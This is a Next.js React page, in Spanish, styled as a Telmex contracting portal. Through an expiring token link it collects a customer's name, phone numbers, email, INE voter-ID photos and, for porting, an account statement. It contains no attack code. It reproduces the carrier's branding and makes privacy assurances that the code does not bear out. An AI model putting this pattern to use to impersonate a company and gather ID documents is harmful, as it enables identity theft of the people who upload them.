'use client';

import React, { useEffect, useState, useRef } from 'react';
import { obtenerSolicitudPorToken, subirDocumentoCliente, completarSolicitud, SolicitudDocumentos } from '@/lib/solicitudes';
import { CheckCircle, Upload, Camera, AlertCircle, Lock, ChevronRight } from 'lucide-react';
import Image from 'next/image';

function TelmexLogo() {
    return (
        <div className="flex items-center gap-2">
            <div className="flex items-center gap-0.5">
                <span className="text-2xl font-black text-white tracking-tighter leading-none">telmex</span>
            </div>
            <div className="w-[3px] h-6 bg-white/40 rounded-full" />
            <span className="text-[11px] font-bold text-white/80 leading-tight tracking-wide uppercase">Portal<br />de Contratación</span>
        </div>
    );
}

function FileUploadZone({
    label,
    hint,
    onChange,
    preview,
    required = false,
}: {
    label: string;
    hint: string;
    onChange: (file: File) => void;
    preview: string | null;
    required?: boolean;
}) {
    const inputRef = useRef<HTMLInputElement>(null);

    return (
        <div className="space-y-2">
            <label className="block text-sm font-bold text-gray-700">
                {label} {required && <span className="text-red-500">*</span>}
            </label>
            <p className="text-xs text-gray-500">{hint}</p>
            <div
                className="relative border-2 border-dashed border-blue-200 rounded-2xl bg-blue-50/50 hover:bg-blue-50 transition-colors cursor-pointer overflow-hidden"
                style={{ minHeight: 120 }}
                onClick={() => inputRef.current?.click()}
            >
                <input
                    ref={inputRef}
                    type="file"
                    accept="image/*,application/pdf"
                    capture="environment"
                    className="hidden"
                    onChange={(e) => {
                        const file = e.target.files?.[0];
                        if (file) onChange(file);
                    }}
                />
                {preview ? (
                    <div className="relative w-full" style={{ minHeight: 120 }}>
                        {preview.startsWith('data:image') ? (
                            // eslint-disable-next-line @next/next/no-img-element
                            <img
                                src={preview}
                                alt={label}
                                className="w-full max-h-48 object-contain rounded-xl"
                            />
                        ) : (
                            <div className="flex items-center justify-center h-24 text-green-600 font-bold text-sm gap-2">
                                <CheckCircle size={20} />
                                Archivo PDF cargado
                            </div>
                        )}
                        <div className="absolute bottom-2 right-2 bg-blue-600 text-white text-[10px] font-bold px-2 py-1 rounded-full">
                            Tocar para cambiar
                        </div>
                    </div>
                ) : (
                    <div className="flex flex-col items-center justify-center gap-3 p-6 text-center">
                        <div className="w-12 h-12 bg-blue-100 rounded-full flex items-center justify-center">
                            <Camera size={22} className="text-blue-600" />
                        </div>
                        <div>
                            <p className="text-sm font-bold text-blue-700">Tomar foto o subir archivo</p>
                            <p className="text-xs text-gray-400 mt-0.5">JPG, PNG o PDF — máx. 10MB</p>
                        </div>
                    </div>
                )}
            </div>
        </div>
    );
}

export default function PortalDocumentosPage({ params }: { params: { token: string } }) {
    const [solicitud, setSolicitud] = useState<SolicitudDocumentos | null>(null);
    const [loading, setLoading] = useState(true);
    const [enviando, setEnviando] = useState(false);
    const [enviado, setEnviado] = useState(false);
    const [error, setError] = useState<string | null>(null);

    const [nombre, setNombre] = useState('');
    const [noTitular, setNoTitular] = useState('');
    const [noReferencia, setNoReferencia] = useState('');
    const [correo, setCorreo] = useState('');

    const [ineFrente, setIneFrente] = useState<File | null>(null);
    const [ineFrentePreview, setIneFrentePreview] = useState<string | null>(null);
    const [ineReverso, setIneReverso] = useState<File | null>(null);
    const [ineReversoPreview, setIneReversoPreview] = useState<string | null>(null);
    const [estadoCuenta, setEstadoCuenta] = useState<File | null>(null);
    const [estadoCuentaPreview, setEstadoCuentaPreview] = useState<string | null>(null);

    const [progreso, setProgreso] = useState(0);

    useEffect(() => {
        const cargar = async () => {
            try {
                const data = await obtenerSolicitudPorToken(params.token);
                if (!data) {
                    setError('Este enlace no es válido o ha expirado.');
                } else if (data.estado === 'completado') {
                    setEnviado(true);
                } else if (new Date(data.expira_en) < new Date()) {
                    setError('Este enlace ha expirado (válido 48 horas). Solicita uno nuevo a tu asesor.');
                } else {
                    setSolicitud(data);
                }
            } catch {
                setError('Ocurrió un error al cargar la página. Intenta de nuevo.');
            } finally {
                setLoading(false);
            }
        };
        cargar();
    }, [params.token]);

    const handleFileChange = (
        file: File,
        setter: (f: File) => void,
        previewSetter: (s: string) => void
    ) => {
        setter(file);
        if (file.type.startsWith('image/')) {
            const reader = new FileReader();
            reader.onload = (e) => previewSetter(e.target?.result as string);
            reader.readAsDataURL(file);
        } else {
            previewSetter('pdf');
        }
    };

    const handleEnviar = async () => {
        if (!solicitud) return;

        // Validaciones
        if (!nombre.trim() || !noTitular.trim() || !correo.trim()) {
            alert('Por favor completa todos los campos obligatorios.');
            return;
        }
        if (!ineFrente || !ineReverso) {
            alert('Debes subir ambos lados de tu INE.');
            return;
        }
        if (solicitud.tipo_servicio === 'portabilidad' && !estadoCuenta) {
            alert('Para portabilidad necesitas subir tu estado de cuenta.');
            return;
        }

        setEnviando(true);
        setProgreso(10);

        try {
            setProgreso(30);
            const ineFrenteUrl = await subirDocumentoCliente(params.token, ineFrente, 'ine_frente');
            setProgreso(55);
            const ineReversoUrl = await subirDocumentoCliente(params.token, ineReverso, 'ine_reverso');
            setProgreso(75);

            let estadoCuentaUrl: string | undefined;
            if (estadoCuenta) {
                estadoCuentaUrl = await subirDocumentoCliente(params.token, estadoCuenta, 'estado_cuenta');
            }
            setProgreso(90);

            await completarSolicitud(params.token, {
                nombre_cliente: nombre.trim().toUpperCase(),
                no_titular: noTitular.trim(),
                no_referencia: noReferencia.trim(),
                correo: correo.trim().toLowerCase(),
                ine_frente_url: ineFrenteUrl,
                ine_reverso_url: ineReversoUrl,
                estado_cuenta_url: estadoCuentaUrl,
            });

            setProgreso(100);
            setEnviado(true);
        } catch (err: any) {
            alert(`Error al enviar: ${err?.message || 'Intenta de nuevo'}`);
            setEnviando(false);
            setProgreso(0);
        }
    };

    // ── PANTALLA DE CARGA ──
    if (loading) {
        return (
            <div className="min-h-screen bg-gradient-to-br from-[#0057A8] to-[#003d7a] flex items-center justify-center">
                <div className="text-white text-center">
                    <div className="w-10 h-10 border-4 border-white/30 border-t-white rounded-full animate-spin mx-auto mb-4" />
                    <p className="font-medium">Cargando...</p>
                </div>
            </div>
        );
    }

    // ── PANTALLA DE ERROR ──
    if (error) {
        return (
            <div className="min-h-screen bg-gradient-to-br from-[#0057A8] to-[#003d7a] flex items-center justify-center p-6">
                <div className="bg-white rounded-3xl shadow-2xl p-8 max-w-sm w-full text-center">
                    <div className="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center mx-auto mb-4">
                        <AlertCircle size={32} className="text-red-500" />
                    </div>
                    <h2 className="text-xl font-black text-gray-900 mb-2">Enlace no válido</h2>
                    <p className="text-gray-500 text-sm">{error}</p>
                </div>
            </div>
        );
    }

    // ── PANTALLA DE ÉXITO ──
    if (enviado) {
        return (
            <div className="min-h-screen bg-gradient-to-br from-[#0057A8] to-[#003d7a] flex items-center justify-center p-6">
                <div className="bg-white rounded-3xl shadow-2xl p-8 max-w-sm w-full text-center">
                    <div className="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4">
                        <CheckCircle size={40} className="text-green-500" />
                    </div>
                    <h2 className="text-2xl font-black text-gray-900 mb-2">¡Documentos Recibidos!</h2>
                    <p className="text-gray-500 text-sm leading-relaxed">
                        Hemos recibido tu información correctamente. Tu asesor Telmex será notificado y se pondrá en contacto contigo para continuar con tu contratación.
                    </p>
                    <div className="mt-6 p-4 bg-blue-50 rounded-2xl">
                        <p className="text-xs text-blue-700 font-medium">
                            🛡️ Tus datos están protegidos bajo las políticas de privacidad de Telmex.
                        </p>
                    </div>
                </div>
            </div>
        );
    }

    const esPortabilidad = solicitud?.tipo_servicio === 'portabilidad';

    // ── FORMULARIO PRINCIPAL ──
    return (
        <div className="min-h-screen bg-gray-50">
            {/* Header Telmex */}
            <header className="bg-gradient-to-r from-[#0057A8] to-[#0072d6] shadow-lg sticky top-0 z-50">
                <div className="max-w-lg mx-auto px-5 py-4 flex items-center justify-between">
                    <TelmexLogo />
                    <div className="flex items-center gap-1 bg-white/15 px-2.5 py-1.5 rounded-full">
                        <Lock size={11} className="text-white/80" />
                        <span className="text-white/90 text-[10px] font-bold tracking-wide">SEGURO</span>
                    </div>
                </div>
            </header>

            <div className="max-w-lg mx-auto px-4 py-6 space-y-5">
                {/* Banner de bienvenida */}
                <div className="bg-gradient-to-r from-[#0057A8] to-[#0072d6] rounded-2xl p-5 text-white shadow-lg">
                    <p className="text-[11px] font-bold uppercase tracking-widest opacity-80 mb-1">
                        {esPortabilidad ? 'Portabilidad de número' : 'Contratación Telmex'}
                    </p>
                    <h1 className="text-xl font-black leading-tight">
                        Envío de documentos
                    </h1>
                    <p className="text-sm text-white/80 mt-2 leading-relaxed">
                        Tu asesor Telmex necesita los siguientes datos para continuar con tu solicitud. El proceso es rápido y 100% seguro.
                    </p>
                </div>

                {/* Formulario */}
                <div className="bg-white rounded-2xl shadow-sm border border-gray-100 overflow-hidden">
                    <div className="bg-gray-50 px-5 py-4 border-b border-gray-100">
                        <h2 className="font-black text-gray-800 text-sm uppercase tracking-wider">Datos Personales</h2>
                    </div>
                    <div className="p-5 space-y-4">
                        <div>
                            <label className="block text-sm font-bold text-gray-700 mb-1.5">
                                Nombre completo <span className="text-red-500">*</span>
                            </label>
                            <input
                                type="text"
                                value={nombre}
                                onChange={e => setNombre(e.target.value)}
                                placeholder="Ej. Juan García Martínez"
                                className="w-full border-2 border-gray-100 focus:border-[#0057A8] rounded-xl px-4 py-3 text-sm font-medium outline-none transition-colors bg-gray-50 focus:bg-white"
                            />
                        </div>

                        <div>
                            <label className="block text-sm font-bold text-gray-700 mb-1.5">
                                Número titular <span className="text-red-500">*</span>
                            </label>
                            {esPortabilidad && (
                                <p className="text-xs text-blue-600 font-medium mb-1.5 bg-blue-50 px-3 py-1.5 rounded-lg">
                                    ⚠️ Debe ser el número que tienes actualmente con Izzi / Totalplay / Megacable
                                </p>
                            )}
                            <input
                                type="tel"
                                value={noTitular}
                                onChange={e => setNoTitular(e.target.value.replace(/\D/g, ''))}
                                placeholder={esPortabilidad ? "Número actual a portar" : "Número de celular o fijo"}
                                maxLength={10}
                                className="w-full border-2 border-gray-100 focus:border-[#0057A8] rounded-xl px-4 py-3 text-sm font-medium outline-none transition-colors bg-gray-50 focus:bg-white"
                            />
                        </div>

                        <div>
                            <label className="block text-sm font-bold text-gray-700 mb-1.5">
                                Número de referencia <span className="text-gray-400 font-normal">(adicional)</span>
                            </label>
                            <input
                                type="tel"
                                value={noReferencia}
                                onChange={e => setNoReferencia(e.target.value.replace(/\D/g, ''))}
                                placeholder="Celular de un familiar o amigo"
                                maxLength={10}
                                className="w-full border-2 border-gray-100 focus:border-[#0057A8] rounded-xl px-4 py-3 text-sm font-medium outline-none transition-colors bg-gray-50 focus:bg-white"
                            />
                        </div>

                        <div>
                            <label className="block text-sm font-bold text-gray-700 mb-1.5">
                                Correo electrónico <span className="text-red-500">*</span>
                            </label>
                            <input
                                type="email"
                                value={correo}
                                onChange={e => setCorreo(e.target.value)}
                                placeholder="correo@ejemplo.com"
                                className="w-full border-2 border-gray-100 focus:border-[#0057A8] rounded-xl px-4 py-3 text-sm font-medium outline-none transition-colors bg-gray-50 focus:bg-white"
                            />
                        </div>
                    </div>
                </div>

                {/* Documentos */}
                <div className="bg-white rounded-2xl shadow-sm border border-gray-100 overflow-hidden">
                    <div className="bg-gray-50 px-5 py-4 border-b border-gray-100">
                        <h2 className="font-black text-gray-800 text-sm uppercase tracking-wider">Documentos Requeridos</h2>
                    </div>
                    <div className="p-5 space-y-5">
                        <FileUploadZone
                            label="INE — Frente"
                            hint="Foto clara del frente de tu credencial de elector"
                            onChange={(f) => handleFileChange(f, setIneFrente, setIneFrentePreview)}
                            preview={ineFrentePreview}
                            required
                        />
                        <FileUploadZone
                            label="INE — Reverso"
                            hint="Foto del reverso de tu credencial de elector"
                            onChange={(f) => handleFileChange(f, setIneReverso, setIneReversoPreview)}
                            preview={ineReversoPreview}
                            required
                        />
                        {esPortabilidad && (
                            <FileUploadZone
                                label="Estado de cuenta"
                                hint="Último recibo o estado de cuenta de tu proveedor actual (Izzi, Totalplay, Megacable, etc.)"
                                onChange={(f) => handleFileChange(f, setEstadoCuenta, setEstadoCuentaPreview)}
                                preview={estadoCuentaPreview}
                                required
                            />
                        )}
                    </div>
                </div>

                {/* Barra de progreso */}
                {enviando && (
                    <div className="bg-white rounded-2xl shadow-sm border border-gray-100 p-5">
                        <p className="text-sm font-bold text-gray-700 mb-3">Subiendo documentos... {progreso}%</p>
                        <div className="w-full bg-gray-100 rounded-full h-3 overflow-hidden">
                            <div
                                className="bg-gradient-to-r from-[#0057A8] to-[#0072d6] h-3 rounded-full transition-all duration-500"
                                style={{ width: `${progreso}%` }}
                            />
                        </div>
                    </div>
                )}

                {/* Aviso de privacidad */}
                <div className="flex items-start gap-3 bg-blue-50 border border-blue-100 rounded-2xl p-4">
                    <Lock size={16} className="text-blue-500 mt-0.5 shrink-0" />
                    <p className="text-xs text-blue-700 leading-relaxed">
                        <strong>Tus datos están protegidos.</strong> Esta información es utilizada únicamente para procesar tu contratación con Telmex y no será compartida con terceros.
                    </p>
                </div>

                {/* Botón enviar */}
                <button
                    onClick={handleEnviar}
                    disabled={enviando}
                    className="w-full bg-gradient-to-r from-[#0057A8] to-[#0072d6] hover:from-[#004a91] hover:to-[#0061b8] text-white font-black text-base py-4 rounded-2xl shadow-lg shadow-blue-500/30 active:scale-98 transition-all flex items-center justify-center gap-3 disabled:opacity-70 disabled:cursor-not-allowed"
                >
                    {enviando ? (
                        <>
                            <div className="w-5 h-5 border-3 border-white/30 border-t-white rounded-full animate-spin" />
                            Enviando documentos...
                        </>
                    ) : (
                        <>
                            <Upload size={20} />
                            Enviar Documentos
                            <ChevronRight size={20} />
                        </>
                    )}
                </button>

                {/* Footer */}
                <div className="text-center pb-6">
                    <p className="text-[11px] text-gray-400">© 2025 Telmex — Todos los derechos reservados</p>
                    <p className="text-[10px] text-gray-300 mt-0.5">Aviso de Privacidad | telmex.com</p>
                </div>
            </div>
        </div>
    );
}
